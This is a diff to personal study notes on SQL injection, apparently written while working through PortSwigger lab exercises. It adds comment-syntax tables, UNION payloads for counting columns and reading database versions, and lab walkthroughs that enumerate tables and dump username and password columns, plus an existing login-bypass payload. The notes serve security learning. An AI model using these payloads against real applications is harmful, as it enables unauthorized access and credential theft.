@@ -16,6 +16,15 @@ https://portswigger.net/web-security/sql-injection/cheat-sheet
 - Payloads deisgned to trigger time delays, look for response time differences
 - OAST payloads
 
+Comments:
+
+| Comment string | Database |
+|----------------|----------|
+| `--comment` | Oracle, PostgreSQL, MSSQL |
+| `/* comment */` | PostgreSQL, MSSQL, MySQL |
+| `#comment` | MySQL |
+| `-- comment` | MySQL |
+
 
 ## Retrieving hidden data
 
@@ -50,13 +59,17 @@ POST request form parameters are `csrf`, `username` and `password`
 
 Username parameter is injectable and authentication can be bypassed with `administrator'--` as the username and any password
 
-## Retrieving data from other database tables
+## Retrieving data from other database tables (UNION attacks)
 
 Use `UNION` to pull data from other tables i.e.
 
 `' UNION SELECT * FROM users--`
 
 More info on union attacks: https://portswigger.net/web-security/sql-injection/union-attacks
+
+### Determining the number of columns required
+
+
 
 ## Blind SQl injection vulnerabilities
 
@@ -73,6 +86,8 @@ More info: https://portswigger.net/web-security/sql-injection/blind
 Use stored values like user names to trigger an injection when the values are retrieved from the database and used in subsequent queries
 
 ## Examining the database
+
+### Querying the database type and version
 
 After identifying a SQLi we can use queries to enumerate the database
 
@@ -100,6 +115,115 @@ Dump the version
 
 ```sql
 UNION SELECT BANNER,NULL FROM v$version--
+```
+
+**Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft**
+
+**Comments need to have a trailing space if using --**
+
+Injection vulnerability in the product category filter, use a UNION to get the database version
+
+Determine how many columns we need using NULL values
+
+```
+# Using -- comments (MySQL)
+'+UNION+SELECT+NULL--+
+'+UNION+SELECT+NULL,NULL--+
+
+# Using # comments (MySQL)
+'+UNION+SELECT+NULL#
+'+UNION+SELECT+NULL,NULL#
+
+# Using --comments (MSSQL, Oracle, PostgreSQL)
+'+UNION+SELECT+NULL--
+'+UNION+SELECT+NULL,NULL--
+```
+
+Get the version number
+
+```
+'+UNION+SELECT+@@version,NULL--+
+```
+
+### Listing the contents of the database
+
+Query the information_schema to get information about the database (except Oracle)
+
+```sql
+-- Query tables
+SELECT * FROM information_schema.tables;
+-- Query columns of a table
+SELECT * FROM information_schema.columns WHERE table_name = 'TableName'
+```
+
+For Oracle databases use all_tables
+
+```sql
+--Query tables
+SELECT * FROM all_tables
+--Query columns of a table
+SELECT * FROM all_tab_columns WHERE table_name = 'TABLENAME'
+```
+
+**Lab: SQL injection attack, listing the database contents on non-Oracle databases**
+
+SQL injection vulnerability in the product category filter, use a UNION attack to retrieve the `administrator` password and log in
+
+Determine what comment string to use and how many columns we need to return using dummy values:
+
+```
+--MSSQL, Oracle, PostgreSQL
+'+UNION+SELECT+NULL--
+
+-- MySQL
+'+UNION+SELECT+NULL--+
+'+UNION+SELECT+NULL#
+```
+
+Dump table names:
+
+```
+'+UNION+SELECT+table_name,NULL+FROM+information_schema.tables--+
+```
+
+Find the user table and pull the columns:
+
+```
+'+UNION+SELECT+COLUMN_NAME,DATA_TYPE+FROM+information_schema.columns+WHERE+table_name+=+'user_table_name'--+
+```
+
+Dump the user table:
+
+```
+'+UNION+SELECT+username_column,password_column+FROM+user_table_name--+
+```
+
+**Lab: SQL injection attack, listing the database contents on Oracle**
+
+SQL injection vulnerability in the product category filter, use a UNION attack to retrieve the `administrator` password and log in
+
+Determine how many columns we need to return using dummy values and `dual` table:
+
+```
+'+UNION+SELECT+NULL+FROM+dual--
+```
+
+Dump table names:
+
+```
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+```
+
+Dump user table columns:
+
+```
+'+UNION+SELECT+COLUMN_NAME,DATA_TYPE+FROM+all_tab_columns+WHERE+table_name+=+'USER_TABLE_NAME'--
+```
+
+Dump the user table:
+
+```
+'+UNION+SELECT+USERNAME_COLUMN,PASSWORD_COLUMN+FROM+USER_TABLE_NAME--
 ```
 
 ## SQL injection in different contexts
